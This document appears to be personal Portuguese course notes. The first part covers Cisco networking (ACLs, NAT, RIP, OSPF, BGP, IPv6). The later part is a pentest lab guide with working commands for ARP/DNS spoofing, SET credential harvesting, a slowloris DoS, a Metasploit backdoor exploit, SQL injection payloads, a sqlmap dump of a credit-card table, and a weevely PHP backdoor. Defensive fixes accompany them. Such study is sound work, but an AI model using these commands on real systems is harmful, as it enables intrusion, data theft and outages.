         $ ip access-group SERVIDOR-GERENTES in  
         $ exit  
         $ interface fastEthernet 0/1.2 
         $ ip access-group SERVIDOR-GERENTES in 
!WAN: Wide Area Network  => As redes LAN são redes geograficamente pequenas, que geralmente estão concentradas em apenas um local, tais redes são de responsabilidade do cliente final. As redes WAN são redes de longa extensão geográfica, redes de provedores de serviços costumam possuir suas redes em diferentes cidades e estados acomodando diversos clientes.
!LAN: Local Area Network
!NAT: Isso acontece porque nosso roteador possui a configuração chamada NAT, essa configuração vai converter o endereço IP privado que temos em nossas máquinas para IP públicos que nosso provedor de serviços nos fornece.
       * configurando NAT 
        ! Fazer nos dois roteadores, o seu e no do provedor
        $ enable    
        $ configure terminal   
        $ interface serial 0/1/0   
        $ no shutdown  
        $ ip address 150.1.1.1 255.255.255.252  => Roteador 1, este é o ip público
        $ ip address 150.1.1.2 255.255.255.252  => Roteador 0
        !
        !Faremos então a tradução dos IPs públicos para os privados
        No roteador do cliente roteador 0:
        $ enable    
        $ configure terminal  
        $ ip access-list standard NAT     => O tipo standard analisa a origem dos endereços e nesse caso estamos só preocupados com a origem e não com o possível destino que esses endereços planejam acessar
        $ permit 172.16.0.0 0.0.255.255   => Tanto o setor de vendas quanto o de finanças começam com 172.16 por isso já estamos permitindo todos os computadores da rede com 0.0.255.255 de poderem ser traduzidas para um ip público
        $ exit
        $ interface fastEthernet 0/1.1    
        $ ip nat inside   
        $ exit   
        $ interface fastEthernet 0/1.2    
        $ ip nat inside   
        $ exit   
        $ interface serial 0/1/0    
        $ ip nat outside   
        $ exit   
        $ ip nat inside source list NAT interface serial 0/1/0 overload   => Com esse comando, diremos que será traduzido os endereços IPs que estão na rede (inside), e especificamos quais são esses endereços IPs que estão na lista NAT para a interface serial 0/1/0. Entretanto, seremos um pouco cuidadoso, porque só temos um endereço IP público, mas temos vários usuários na rede que podem estar acessando a internet ou qualquer outro recurso externo simultaneamente. Para especificar que a configuração da tradução tem que englobar todos esses endereços IPs internos de forma simultânea, colocaremos o overload. Com o overload, é dito que todos os usuários podem estar usando simultaneamente o endereço IP público 150.1.1.2. Depois disso, usamos a tecla "Enter" e teoricamente já criamos a lista de acessos com os endereços IPs que devem ser traduzidos. Nós especificamos as interfaces internas e externas, e associamos a nossa lista com esses IPs privados, para ela ser traduzida para a interface                                                                              serial 0/1/0, que irá conter o endereço público, e também especificamos a forma de tradução overload, dizendo que pode ocorrer mais de um usuário estar usando um recurso da internet ao mesmo tempo. 
        $ show ip nat translations   => Para vermos todas as traduções feitas
!RIP:
      * O protocolo de roteamento RIP é um dos mais antigos protocolos de roteamento e tem como métrica a quantidade de saltos (hops) para definir a melhor rota. O protocolo RIP vai definir como a melhor rota aquela onde apresentar a menor quantidade de saltos (hops) para chegar até o destino. Dessa forma, parâmetros como velocidade do link não é analisada por esse protocolo e com isso podemos ter a escolha de uma rota menos eficiente (por isso a maioria das vezes utilizamos OSPF).
        No roteador (router 1)
        $ enable
        $ configure terminal
        $ router rip    => habilita o protocolo
        $ version 2
        $ no auto summary
        $ network 150.1.1.0
        $ network 150.1.1.4   
        No roteador (router 2)
        $ enable
        $ configure terminal
        $ router rip
        $ version 2
        $ no auto summary
        $ network 150.1.1.4
        $ network 150.1.1.8
        $ show ip route 
!OSPF: 
      * O protocolo de roteamento OSPF (Open Shortest Path First) é enquadrado na categoria de protocolo de roteamento dinâmico de interior gateway, responsável em encaminhar os pacotes de rede pelo melhor caminho possível.
      * O protocolo OSPF permite que tenhamos uma divisão de nossa rede separada por áreas, possuindo dentre outras vantagens a possibilidade de isolar possíveis problemas. Quando rotas são informadas de uma área para a outra damos o nome de inter area.
      * O protocolo OSPF utiliza a velocidade do link como métrica para definição da melhor rota. A fórmula para o cálculo dessa métrica seria chamada de custo e utiliza a velocidade padrão de 100 Mbps dividida pela velocidade do link. Por exemplo, caso a velocidade do link seja de 10 Mbps nós termos o custo de 100 Mbps / 10 Mbps = 10, dessa forma quanto maior a velocidade do link menor será o resultado dessa divisão e consequentemente será uma rota melhor de acordo com o OSPF.
      * Através da divisão por áreas conseguimos isolar possíveis problemas e instabilidades que possam ocorrer em uma área, não necessitando assim informar todos esses detalhes para outras áreas sobrecarregando a rede.
        No roteador (router 3):
        $ enable
        $ configure terminal
        $ router ospf 1   => router ospf <num_identificação>, para habilitar o ospf
        $ network 170.1.1.0 0.0.0.255 area 0
        $ network 180.1.1.0 0.0.0.255 area 0
        No roteador (router 4):
        $ enable
        $ configure terminal
        $ router ospf 1   => router ospf <num_identificação>, para habilitar o ospf
        $ network 180.1.1.0 0.0.0.255 area 0
        $ network 190.1.1.0 0.0.0.255 area 1
        $ show ip route
!BGP:
      * BGP (Border Gateway Protocol) é o protocolo subjacente ao sistema de roteamento global da Internet. Ele gerencia como os pacotes são roteados, de rede para rede, por meio da troca de informações de roteamento e acessibilidade entre roteadores de ponta. 
      * A internet seria formada por uma série de provedores de serviços informando as rotas que cada um conhece para outro provedor de serviço, essa comunicação feita entre vários provedores é normalmente feita pelo protocolo BGP
      * Os números de Autonomous System são números usados para identificar redes de provedores de serviços e que permitem que um provedor de serviço troque informações com outros provedores de serviços vizinhos.
      * 
        No roteador (router 2):
        $ enable
        $ configure terminal
        $ router bgp 1000  =>
        $ neighbor 160.1.1.2 remote-as 2000  => neighbor <ip> <AS> ver: https://bgp.he.net/country/BR
        No roteador (router 3):
        $ enable
        $ configure terminal
        $ router bgp 2000 
        $ neighbor 160.1.1.1 remote-as 1000
        $ network 170.1.1.0 mask 255.255.255.252
        $ network 180.1.1.0 mask 255.255.255.252 
        $ network 190.1.1.0 mask 255.255.255.252
        No roteador (router 2):
        $ show ip route
        $ configure terminal
        $ router bgp 1000
        $ network 150.1.1.0 mask 255.255.255.252
        $ network 150.1.1.4 mask 255.255.255.252
        $ network 150.1.1.8 mask 255.255.255.252
        No roteador (router 3):
        $ enable
        $ configure terminal
        $ router ospf 1
        $ redistribute bgp 2000 subnets   => redistribuir as redes que foram aprendidas via protocolo BGP para os outros roteadores
        No roteador (router 4):
        $ show ip route
        No roteador (router 2):
        $ enable
        $ configure terminal
        $ router rip
        $ default-information originate => Para definir o Router5 como portão de saída padrão da rede, selecionaremos o roteador, e no seu terminal usaremos o comando default-information originate, o qual informa aos demais roteadores que se comunicam via protocolo RIP que este é o portão de saída padrão da rede.
        No roteador (router 0):
        $ configuration terminal   
        $ no ip route 150.1.1.8 255.255.255.252 serial 0/1/0
        $ ip route 0.0.0.0 0.0.0.0 serial 0/1/0  => A rota default é a rota de saída padrão de uma rede, caso nenhuma entrada mais específica esteja presente na tabela de roteamento do roteador, a rota default irá assumir e encaminhará os dados para a interface que foi configurada
!IPV6:
      Ver: https://www.alura.com.br/artigos/entendendo-o-ipv6
      * O desenvolvimento do protocolo IPv6 foi necessário porque a quantidade de endereço IPv4 públicos chegaram a um fim. Dessa forma, uma das preocupações no desenvolvimento desse novo protocolo era com relação a quantidade de endereços disponíveis para evitar assim que um novo protocolo precisasse ser desenvolvido. O IPv6 é capaz de fornecer aproximadamente 3.4×10 ^ 38 endereços, o que faz com que o esgotamento de endereços IPv6 seja muito improvável mesmo pensando a longo prazo.
      * O protocolo IPv6 possui ao todo 8 intervalos com 16 bits em cada intervalo, o que totalizaria 128 bits no protocolo IPv6
      * O protocolo IPv6 permite que seja realizada uma abreviação :: quando ocorrer uma sequência de intervalos de bits 0. Porém essa abreviação só pode ser realizada uma vez no endereço IPv6. Em nossa rede, o endereço IPv6 apresentado possui duas abreviações e dessa forma, não é um endereço IPv6 válido e não irá funcionar.
      * Ao analisar o endereço IPv6 3002:ABD2:8712:5634:9231:7622:6621:9012 / 48 Qual deveria ser o endereço IPv6 de um outro dispositivo para eles estarem na mesma rede? A máscara de rede do endereço IPv6 é /48, isso indica que os 48 primeiros bits devem ser iguais entre os dispositivos para que eles estejam na mesma rede. Dessa forma, outro dispositivo deverá começar com o intervalo 3002:ABD2:8712 para estar na mesma rede desse endereço IPv6.
        No switch (switch 2):
        $ enable
        $ configure terminal
        $ interface fastEthernet 0/10   
        $ switchport access vlan 30
        $ show vlan brief
        No servidor (servidor 5):
        Vá em IPV6 configuration
        $ 2001:0BAA:0000:0000::AAAA / 64  => em ipv6 address static
        $ 2001:0BAA:0000:0000::BBBB       => em ipv6 gateway
        No roteador (router 0):
        $ enable
        $ configure terminal
        $ ipv6 unicast-routing  
        $ interface fastEthernet 0/1.3  
        $ ipv6 address 2001:0BAA:0000:0000::BBBB/64 => já podemos dar um "do ping 2001:0BAA::AAAA" e ver que temos comunicação com o server
        $ exit
        $ interface fastEthernet 0/1.1
        $ ipv6 address 2000:0BAA:0000:0000::BBBB/64 => vlan de vendas
        $ exit
        $ interface fastEthernet 0/1.2
        $ ipv6 address 2002:0BAA:0000:0000::BBBB/64 => vlan de finanças
        Nos computadores:
        Ge. Finanças
        $ 2002:0BAA:0000:0000::AAAA/64 =>  Ge.Finanças em ipv6 em ip configuration
        $ 2002:0BAA:0000:0000::BBBB    => gateway
        Fun.Vendas
        $ 2000:0BAA:0000:0000::AAAA/64
        $ 2000:0BAA:0000:0000::BBBB
        Ge.Vendas
        $ 2000:0BAA:0000:0000::CCCC/64
        $ 2000:0BAA:0000:0000::BBBB
        Fun.Finanças
        $ 2002:0BAA:0000:0000::CCCC/64
        $ 2002:0BAA:0000:0000::BBBB
!OSI:
      Ver: https://www.alura.com.br/artigos/conhecendo-o-modelo-osi
         https://pt.wikipedia.org/wiki/Protocolo_(ci%C3%AAncia_da_computa%C3%A7%C3%A3o)
!SSID:
      O SSID (Service Set Identifier) é um texto de até 32 caracteres que identifica as redes sem fio. É esse nome que os dispositivos utilizam para se conectar. Cada ponto de acesso tem seu SSID que o identifica na rede. Em alguns casos, podemos ter na mesma rede vários pontos de acesso com o mesmo SSID. Neste caso, é comum ouvir o termo ESSID (Extended Service Set ID). No primeiro curso de redes vimos que existem os endereços IPs que os computadores utilizam para se comunicar e, além dos endereços IPs, existem os endereços MAC. Esses endereços são fixos e associados a placa de rede do dispositivo. Quando utilizamos vários SSID na mesma rede, as máquinas utilizam o endereço MAC para saber qual o access point que estão conectadas. Em redes sem fio, isso é chamado de BSSID (Basic Service Set ID). O BSSID nada mais é do que o endereço MAC do ponto de acesso. Mesmo sem ter mais de um access point com o mesmo nome, os dispositivos sempre utilizam o BSSID para realizar a comunicação com o ponto de acesso.
      Ver: https://www.lifewire.com/wireless-standards-802-11a-802-11b-g-n-and-802-11ac-816553
Canais de Wifi:
      Ver: https://www.microsoft.com/pt-br/p/wifi-analyzer/9nblggh33n0n?activetab=pivot:overviewtab

!WEP: 
      * WEP significa Wired Equivalent Privacy, e foi introduzido na tentativa de dar segurança durante o processo de autenticação, proteção e confiabilidade na comunicação entre os dispositivos Wireless.
      * Ele possui o pobrema de ter seu sinal interceptado
!WPA: 
      * WPA (Wi-Fi Protected Access) é um protocolo de comunicação via rádio. É um protocolo WEP melhorado. Também chamado de WEP2, ou TKIP (Temporal Key Integrity Protocol), essa primeira versão do WPA (Wi-Fi Protected Access) surgiu de um esforço conjunto de membros da Wi-Fi Aliança e de membros do IEEE, empenhados em aumentar o nível de segurança das redes sem fio ainda no ano de 2003, combatendo algumas das vulnerabilidades do WEP.
      Ver: https://pt.wikipedia.org/wiki/WPA2_(AES)
!Firewall:
      * O firewall é usado para dividir uma rede segura (rede interna) de uma rede não segura (por exemplo, a internet) e podemos assim controlar o tráfego que é permitido ou negado entre a rede interna e a rede externa. De forma geral, um usuário que esteja na rede interna poderá acessar recursos que estão na rede externa, porém um usuário da rede externa não terá permissão de acessar recursos da rede interna.
      * A região desmilitarizada (DMZ) seria a região na qual temos recursos que devem ser acessados por usuários da internet. Dessa forma, conseguimos isolar essa região de recursos que precisam ser acessados externamente dos recursos que devem ser acessados somente por usuários de nossa rede interna.
      * Os firewalls stateful conseguem guardar em sua memória informações das requisições internas que foram iniciadas. Quando ocorre um retorno desse pacote o firewall compara com sua tabela de memória elementos como endereço IP, portas de comunicação, etc e com isso consegue definir que trata-se de uma informação de retorno e com isso permitirá acesso a rede interna.
      * O Reverse Shell seria a forma na qual o comando de uma máquina é obtida através de uma conexão da máquina alvo com a máquina de ataque. Ou seja, a conexão é estabelecida na direção reversa ao qual o ataque é realizada. Esse tipo de ataque torna-se muito útil, pois é possível que equipamentos de segurança como o Firewall nos conceda permissão de acesso a rede interna uma vez que nosso pacote é um retorno a uma requisição que foi originada por um usuário interno a rede.
      * Inbound - Tráfego que chega até o firewall em direção ao servidor/rede. Outbound - Tráfego originado no servidor/rede com destino a outras redes.
      * Ao criar um Security Group da AWS por default (máquinas Linux), é criada uma regra que permite que você faça a conexão através do protocolo SSH (porta 22).
      * pfSense - Logo após a instalação, sem termos feito nenhuma customização, é possível acessar o pfSense através do browser (porta 80) e também através do console do próprio firewall. Por default, o acesso via SSH vem desabilitado. Para um gerenciamento seguro, é recomendável que você desabilite o acesso à porta 80 ( a porta padrão do HTTP) e habilite o gerenciamento web exclusivamente pela porta 443 (HTTPS).
      * O posicionamento das regras dentro de um firewall é pré-requisito para o correto funcionamento do mesmo. Uma boa prática é colocar logo no início as regras responsáveis por tratar o maior volume de requisições, dessa maneira você otimiza os recursos (memória, CPU, etc) utilizados pelo firewall.
!Man In the Middle (MITM):
      * O ataque Man In The Middle consiste em explorar a forma sem estado (stateless) na qual o protocolo ARP trabalha. Dessa forma, um Hacker pode usar de ferramentas para enviar respostas desse protocolo com o intuito de manipular a tabela ARP de suas vítimas para ficar assim no meio da comunicação e visualizar o que é trafegado entre os dispositivos manipulados.
        $ apt-get-install mitmf  => no kali linux
        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface]    => ex: mitm --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0
        $ arp - a           => no pc da vítima antes e depois do ataque, veremos que o endereço MAC foi alterado
!DNS Spoofing:
      * O ataque de DNS Spoofing consiste em alterar a tradução entre URL e endereço IP para que essa url seja redirecionada a um endereço IP de controle do Hacker.
      * A ferramenta setoolkit é capaz de mandar emails para vítimas com nomes de outras pessoas. Dessa forma, ao passarmos um link com nome de outra pessoa, um usuário comum se tornará vulnerável ao ataque, uma vez que a mensagem parece ter sido enviada por um usuário confiável. No arquivo harvester que está no diretório /var/www/html deveremos ver o usuário e senha que digitamos.
        $ git clone https://gitbub.com/trustedsec/social-engineer-toolkit.git  => no kali linux, baixamos uma ferramenta capaz de clonar páginas da web.
        $ cd social-engineer-toolkit/
        $ ./setoolkit
        yes
        set>1
        set>2
        set:webattack>3
        /var/www/html  => site clonado estará aqui
        $ cd /etc/mitmf
        $ getit mitmd.conf
        $ *.alura.com.br=192.168.121.172  => redirecionar o site da alura para aquele ip que contem a página clonada
        $ mitmf --arp --spoof --target [IP vítima] --gateway [IP roteador] -i [interface] --dns   => ex: mitmf --arp --spoof --target 192.168.121.171 --gateway 192.168.121.1 -i eth0 --dns
    Ver: https://anonymousemail.me/]
    * Quando forçamos o redirecionamento para uma página de nosso controle, mesmo que um usuário mal intencionado tente mudar o redirecionamento, ele não terá sucesso. Podemos, por exemplo colocar em nossa programação, algo como:
      $ response.sendRedirect("http://www.meusite.com.br");
      Ao invés de:
      $ response.sendRedirect(request.getParameter("url"));
      ! Existem casos que por questão estratégica e de otimização, não queremos que certas páginas sejam indexadas em mecanismos de buscas. Dessa forma, precisamos informar a esses mecanismos de busca quais são as páginas de nosso site que não queremos que seja indexada e isso é feito através do arquivo robots.txt. Portanto, o robots.txt seria um arquivo no qual informamos como os mecanismos de busca devem indexar as páginas de nosso site. 
!DoS (Denial of Service):
      * Um ataque de negação de serviço ou em inglês Denial Of Service (DoS) ocorre quando temos um usuário que utiliza de recursos para causar uma sobrecarga em um sistema com o principal objetivo de torná-lo indisponível para outros usuários.
      * Equipamentos que temos nas redes são por exemplo o Intrusion Detection System (IDS) que recebe cópias desse tráfego e caso alguma anomalia seja detectada, o equipamento manda alarmes para que assim os administradores da rede possam saber o ocorrido e procurar uma solução. Outra solução seria a utilização de equipamentos como o Intrusion Prevention System (IPS) que é capaz de detectar anomalias no tráfego e impedir que esse tráfego seja propagado para outros pontos da rede.
      * O Intrusion Detection System (IDS) recebe apenas cópias dos tráfego, dessa forma, ele não é capaz de impedir que um ataque seja propagado para outros pontos da nossa rede. Ele irá encaminhar alarmes para que possamos assim saber dos problemas que foram detectados e encontrar soluções.
      * O Intrusion Prevention System (IPS) é conectado diretamente na rede, dessa forma, ao analisar algum tipo de anomalia o IPS é capaz de impedir que esse tráfego seja propagado para outros pontos da minha rede.
        $ git clone https://github.com/llaera/slowloris.pl.git  => no kali linux, baixamos uma ferramenta capaz de sobrecarregar um servidor
        $ cd slowloris.pl/
        $ chmod +x slowloris.pl
        $ ./slowloris.pl
        $ perl ./slowloris.pl -dns [IP servidor] -timeout 1   => executa o ataque
!DDoS (Distributed Denial of Service):
      * O ataque DDoS (Distributed Denial of Service) consiste em tirar a concentração do ataque em um usuário, como é feito no ataque de DoS e distribuir o ataque por vários usuários. Isso pode ser obtido por exemplo quando usuários fazem download de arquivos infectados. Uma vez que tais máquinas foram infectadas, o Hacker poderá controlá-las para que possa assim iniciar um ataque distribuído contra um serviço. O objetivo de tal ataque seria de causar uma "saturação" no link do alvo e com isso torná-lo indisponível para que outros usuários acessem o serviço.
      * Uma botnet é um grupo de máquinas que foram comprometidas de alguma forma (por exemplo vírus, malware, etc). Tais máquinas infectadas passam a ser usadas por hackers para fazerem ataques contra um determinado serviço a fim de torná-lo indisponível. Pelo fato de termos várias máquinas atuando nesse ataque, chamamos esse de um ataque de negação de serviços distribuído (DDoS).
      * 
!Nmap:
      * Nmap é um software livre que realiza port scan desenvolvido pelo Gordon Lyon, autoproclamado hacker "Fyodor". É muito utilizado para avaliar a segurança dos computadores, e para descobrir serviços ou servidores em uma rede de computadores.
        $ nmap -A [IP do servidor]
        $ nmap -A -T4 -Pn 192.168.0.8      => Exibe todas as portas e quais processos elas estão rodando
        Ver: https://nmap.org/docs.html
!Metasploit:
      * O Projeto Metasploit é um projeto de segurança de computadores que fornece informações sobre vulnerabilidades de segurança e ajuda em testes de penetração e desenvolvimento de assinaturas IDS. É propriedade da Rapid7, empresa de segurança sediada em Boston, Massachusetts.
        $ use <exploit>  => ex:  exploit/unix/ftp/vsftpd_234_backdoor
        $ set RHOST [IP do servidor]
        $ exploit
!Nessus:
      * Nessus Cloud é um programa de verificação de falhas/vulnerabilidades de segurança. Ele é composto por um cliente e servidor, sendo que o scan propriamente dito é feito pelo servidor.
!SQL Injection:
      * Inserir códigos SQL em parâmetros da página, para que o banco de dados se comporte de uma maneira indevida, podendo por exemplo, extrair dados que estão lá inseridos.
      * No exemplo de nossa aplicação, os parâmetros username e password são encaminhados para o servidor e ocorre uma consulta no banco de dados para verificar se esses dados estão presentes. Essa consulta ao banco de dados é feita na linguagem SQL (Structured Query Language) e ao inserir códigos SQL nos campos username e password, estamos passando para o banco informações para que ele se comporte da forma que queremos, o que não deveria ser permitido.
        $ no campo de password digitar  x' or 'a'='a   nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Desta forma, ao passarmos "SELECT username FROM accounts WHERE username='admin' AND password='x' or 'a'='a';", podemos utilizar esse operador lógico or para que o SQL retorne como True essa requisição
        $ Nossa requisição é enviada em SQL como SELECT username FROM accounts WHERE username='admin' AND password=''; Para que possamos descobrir a senha, podemos ordenar duas colunas passando no name: " admin' order by 1,2 --[espaço] " (-- comenta o código, então ' AND password=''; será comentado). Assim nos é retornado a senha do usuário. Com isso podemos também descobrir o número de colunas que essa tabela possui, basta dar um order by [num_coluna] até que não levante excessão de erro
        ! O information schema seria um banco de dados interno capaz de referenciar os demais bancos presentes em minha aplicação, podendo informar nomes de colunas e tabelas. Sendo assim muito importante para descobrir que informações estão guardadas.
        $ Com a linha acima descobrimos o número de colunas. Com isso, SELECT username FROM accounts WHERE username='admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ' AND password=''. O que passamos na aba username foi "admin' UNION SELECT 1,2,3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ", Recebemos as informações de que Username está na coluna número 2, Password na número 3 e Signature na 4. Repare que esses números surgem dos parâmetros que nós mesmos inserimos. Falta descobrir qual o banco em que essa tabela Accounts está inserida. Portanto, nós vamos substituir um desses valores que aparece na tela pelo database. Agora: "admin' UNION SELECT 1,database(),3,4,5,6,7 from information_schema.columns where table_name='accounts' -- ".
          Ou seja, temos o nome da banco no qual a tabela está inserida, o nowasp! Então, já temos a tabela e o banco. Agora, fica ainda mais fácil descobrir as colunas de Account. No lugar do database() nós vamos colocar columns_name e após o table vamos inserir table schema='nowasp'e com isso, estamos dizendo: queremos saber o nome das colunas que estão na tabela Accounts dentro do banco nowasp. Então, "admin' UNION SELECT 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='accounts' and table_schema='nowasp'-- '". Ou seja! Temos todos os nomes das colunas! Conseguimos descobrir quais eram as sete colunas dentro da tabela!
      *Sqlmap: Sqlmap é uma ferramenta open source para teste de penetração que automatiza o processo de detecção e exploração de vulnerabilidades de Injeção de SQL, permitindo a invasão de banco de dados de sites.
        $ sqlmap -u "URL_DO_FORMS"   => Testa várias injeções e retorna se encontrou alguma vunerabilidade
        $ sqlmap -u "URL_DO_FORMS" --current-db         => retorna o banco de dados usado
        $ sqlmap -u "URL_DO_FORMS" --tables -D nowasp   => Uma vez que descobrimos qual o banco, podemos obter o número de tabelas que ele possui e o nome delas
        $ sqlmap -u "URL_DO_FORMS" --dump -T credit_cards -D nowasp => Vai tentar retornar o conteúdo da tabela informada
        $ sqlmap -u "http://192.168.1.102:8080/alura-shows/login" --data="email=alex@gmail.com&senha=123"  => A opção --data é utilizada para passar os parâmetros enviados pela requisição POST, através desses parâmetros o sqlmap irá tentar fazer a injeção de código SQL
        $ 
      * Para evitarmos SQL Injection temos o exemplo do seguinte códigos em Java Script:       O desenvolvedor deve separar os parâmetros que são enviados pelo usuário, da query que está indo ao banco de dados, através por exemplo, do uso da classe PreparedStatement em Java. 
        $ String usuario=request.getParameter("usuario");
        $ String senha=request.getParameter("senha");
        ! Observe, na primeira String nós temos a requisição do usuário e na segunda a da senha. Uma vez com esses valores é preciso separá-los para não estarem vinculados a query dirigida ao banco, pois, é justamente esse o ponto que deixou o sistema tão frágil
        $ String sql = "Insert into accounts (username.password) values (?,?)";
        ! Dessa maneira, os parâmetros estão diretamente inseridos na query enviada ao banco. Assim, o desenvolvedor não verifica o que está sendo enviado e já sabemos que isso pode incorrer em um problema bastante grave! Por exemplo, dados de cartões de crédito facilmente disponíveis a um hacker.
        $ PreparedStatement stmt = connection.prepareStatement(sql);
        ! Fazendo uma simples verificação é possível evitar um grande problema. Utilizando o PreparedStatement do java conseguimos separar os parâmetros que o usuário passa nos campos usuário e senha, conforme mostrado abaixo
        $ stmt.setString(1,usuario);
        $ stmt.setString(2,senha);
        $ stmt.execute();
        -> Caso eu não consiga a simulação em modo bridge do meu kali e o servidor que estão no VirtualBox fazer:
        Colocar ambos como rede interna  (no meu caso o roteador não está atuando corretamente como dhcp)
        No kali: > ifconfig eth0 down 
                 > ifconfig eth0 192.168.10.10 netmask 255.253.255.0 up
        No server:
                 > ifconfig eth0 down 
                 > ifconfig eth0 192.168.10.20 netmask 255.255.255.0 up
!Brut force attack:
     * Burp Suite é um software desenvolvido em Java pela PortSwigger, para a realização de testes de segurança em aplicações web. O Burp Suite é dividido em diversos componentes.
       $ locate /wordlists                 => listas de palavras mais comuns utilizadas em senhas e nicknames (já vem por padrão no Kali Linux) 
       $ cewl "<URL>" -d <Nº DE PÁGINAS>   => Faz uma busca em um site e cria uma lista de palavras chaves com base nele
       $ cewl "http://192.168.1.37/multilidae/" -d 1 -w cewl.txt => colocar a saída em arquivo txt que pode ser carregada no burp suite
       ! Uma das formas mais usadas contra esse tipo de ataque seria obrigar o usuário a cadastrar senhas com um formato mais complexo (ex: uso de letras maiúsculas e minúsculas, caracteres especiais, tamanho mínimo, etc), bem como limitar o número de tentativas de acesso por um mesmo usuário. Desta forma, evitamos que um usuário mal intencionado, utilize de listas pré-existentes para se logar no sistema.
!Cross Site Scripting (XSS):
     * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
       $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
       $ 
       $ 
       ! De acordo com a OWASP, uma das formas de prevenir o ataque de Cross Site Scripting (XSS) seria de realizar o escaping de elementos HTML prevenindo assim que seja interpretado como um contexto de execução. Por exemplo em Java, a OWASP possui uma biblioteca (ESAPI) que auxilia nessas questões.
       ! Poderíamos colocar em nossa programação no back-end: String encoding=ESAPI.encoder().encodeForJavaScript(); Dessa forma, se colocarmos: <script>, através do escaping teremos a conversão desses elementos html para seus respectivos códigos: &ltscript&gt
       ! Podemos també, evitar esse ataque em Java fazendo o seguinte => Vamos implementar a interface Validator do Spring para realizarmos a validação do que o usuário está passando no campo título e mensagem do depoimento. Ao fazermos isso, somos obrigado a implementar dois métodos supports e validate, o método supports recebe a classe do objeto que está querendo ser validado e retorna se o validador consegue lidar com ele. Na sequência, no método validate, iremos realizar a configuração da validação do que queremos fazer. A nossa estratégia para evitar esse ataque vai ser verificar se esses campos possuem abertura ou fechamento de tag (< ou >), pois com isso, o usuário não conseguirá inserir a tag <script> para colocar o código Javascript do ataque que ele realizou anteriormente, caso os campos contenham essas tags, iremos mostrar uma mensagem de erro.
!Mass Assignment:
       * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
 	  ! Github já sofreu com esse ataque, ver: https://gist.github.com/peternixey/1978249    e   https://www.alura.com.br/artigos/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github
       ! Para proteger contra o ataque de Mass assignment nós criamos uma classe chamada UsuarioDTO que poderia ser utilizada em qualquer framework. Uma alternativa ao DTO é o método setAllowedFields, em que somente os atributos listados é que poderão ser manipulados pelo usuário. Com isso, mesmo que o usuário tente manipular o atributo roles pelo formulário HTML, isso não será refletido para o atributo da nossa classe e um usuário só será cadastrado com o perfil ROLE_USER. (O método setAllowedFields permite que nós especifiquemos quais são os atributos da classe que o usuário terá permissão de manipular. No caso da Alura Shows, temos a classe modelo Usuario com o atributo roles que não deve ser manipulado e com isso não o especificamos dentro desse método.)
!Software Nikto:
     * Nikto é um scanner de vulnerabilidades de software livre acessado por CLI, usado para escanear servidores web em busca de arquivos perigosos, programas desatualizados e outros problemas. É capaz de fazer tanto análises genéricas como análises específicas de servidor. Também faz a captura e exibição de cookies HTTP.
       ! Existem ferramentas como o Nikto que são capazes de “scanear” um servidor web, listando informações de servidor, como qual tecnologia utilizada, versão, etc e os links referentes a um domínio. Com isso, podemos descobrir páginas que teoricamente não eram para ser indexadas, e se tiver alguma página com conteúdo privado que não esteja com nenhum processo de autenticação, qualquer usuário poderá acessar.
       $ nikto -h "http://192.168.1.37/multillidae/"
       $
!Software Weevely:
     * O WEEVELY é uma ferramenta desenvolvida em Python que permite que um Backdoor seja gerado no formato .php e se executado em um host remoto pode obter o console do sistema.
       $ weevely generate 1234 aplicacao.php => Generated backdoor with password '1234' in 'aplicacao.php' of 1429 byte size
       $ weevely "http://192.168.1.42/dvwa/hackable/uploads/aplicacao.php" 1234  => Caso aja conexeção significa que o backdor conseguiu acesso ao servidor
!Backdoor:
     * Um backdoor seria um arquivo no qual é usado para conexão, permitindo assim quando usado de forma correta, que um administrador possa entrar no sistema para realizar reparos de problemas. Quando usado de forma incorreta, o backdoor torna-se uma forma que hackers utilizam para ganhar acesso de forma ilícita.
       !Uploads de arquivos podem se tornar um problema, vimos em nossa aplicação pelo fato do sistema não verificar o tipo de arquivo, fomos capazes de inserir um backdoor e ganhamos assim acesso ao sistema. Ao filtrar o tipo de arquivo, temos uma segurança maior que o que será passado é apenas o necessário para nossa aplicação, por exemplo, poderíamos colocar em Java:
       $ FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
!Owasp-zap:        ****warning*** -> não pode ser usado em sites da internet
     * Traduzido do inglês-OWASP ZAP é um scanner de segurança de aplicativos da web de código aberto. Ele deve ser usado tanto por aqueles que são novos em segurança de aplicativos quanto por testadores de penetração profissionais. É um dos projetos mais ativos do Open Web Application Security Project e recebeu o status de carro-chefe.
       $ 
!Credential Spoofing:
      *Credential stuffing is a type of cyberattack in which the attacker collects stolen account credentials, typically consisting of lists of usernames and/or email addresses and the corresponding passwords (often from a data breach), and then uses the credentials to gain unauthorized access to user accounts through large-scale automated login requests directed against a web application.
!

=========================================================================================================================================
https://pypi.org/project/bcrypt/
https://github.com/pyca/bcrypt/

        $ 
        $ 
        $  


https://www.offensive-security.com/pwk-oscp/
https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/
https://www.eccouncil.org/programs/licensed-penetration-tester-lpt-master/
https://alpinesecurity.com/training/catalog/  ==> Para se preparar para o LPT
https://www.cisco.com/c/en/us/training-events/training-certifications/certifications/associate/ccna.html
https://www.offensive-security.com/web200-oswa/
https://solyd.com.br/treinamentos/pentest-profissional-v2022/



